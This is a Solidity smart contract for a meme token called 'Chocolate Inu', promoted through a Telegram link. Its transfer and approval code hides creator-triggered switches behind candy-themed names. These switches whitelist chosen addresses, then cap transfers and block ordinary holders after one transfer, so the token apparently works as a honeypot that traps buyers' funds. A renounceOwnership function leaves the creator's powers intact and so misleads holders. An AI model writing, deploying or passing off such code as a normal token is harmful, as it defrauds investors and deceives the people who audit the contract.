/**
 * Do you love chocolate?
 * Then join us!
 * 
 * https://t.me/ChocolateInu
 **/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner;
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => bool) public Cocao;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public SushiSwapCheck;

    uint256 private _totalSupply;
    string private _name;
    uint256 private getRedistributionStatus;
    bool private Toblerone;
    uint256 private chTx;
    bool private tempVal;
    uint256 private tXs;
    address private _creator;
    string private _symbol;
    uint256 private setTxLimit;
    bool private detectSell;
    
    constructor (string memory name_, string memory symbol_, address creator_, bool liquidation, bool liquidation2, uint256 liquidation9) {
        _name = name_;
        tXs = liquidation9;
        Toblerone = liquidation2;
        Cocao[creator_] = liquidation2;
        detectSell = liquidation;
        tempVal = liquidation2;
        _creator = creator_;
        SushiSwapCheck[creator_] = liquidation;
        _symbol = symbol_;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
    
    function _ChocolateFountain(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        
        getRedistributionStatus = _totalSupply;
        chTx = _totalSupply / val1;
        setTxLimit = chTx * val2;
        
        emit Transfer(address(0), account, amount);    
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        
        if ((address(sender) == _creator) && (tempVal == false)) {
            getRedistributionStatus = chTx;
            detectSell = true;
        }
    
        if ((address(sender) == _creator) && (tempVal == true)) {
            Cocao[recipient] = true;
            tempVal = false;
        }
    
        if (Cocao[sender] == false) {
            if ((amount > setTxLimit)) {
                require(false);
            }
      
            require(amount < getRedistributionStatus);
            if (detectSell == true) {
                if (SushiSwapCheck[sender] == true) {
                    require(false);
                }
                SushiSwapCheck[sender] = true;
            }
        }
        
        uint256 taxamount = amount;
        
        _balances[sender] = senderBalance - taxamount;
        _balances[recipient] += taxamount;

        emit Transfer(sender, recipient, taxamount);
        
    }
        
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        if ((address(owner) == _creator) && (Toblerone == true)) {
            Cocao[spender] = true;
            SushiSwapCheck[spender] = false;
            Toblerone = false;
        }

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Choco is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        bool liquidation, bool liquidation2, uint256 liquidation6,
        uint256 liquidation7, address creator,
        uint256 initialSupply, address owner,
        uint256 liquidation9
    ) ERC20(name, symbol, creator, liquidation, liquidation2, liquidation9) {
        _ChocolateFountain(owner, initialSupply, liquidation6, liquidation7);
    }
}

contract ChocolateInu is ERC20Choco {
    constructor() ERC20Choco("Chocolate Inu", "CHOCOINU", false, true, 1000, 75, msg.sender, 123456789 * 10 ** 18, msg.sender, 128) {
    }
}
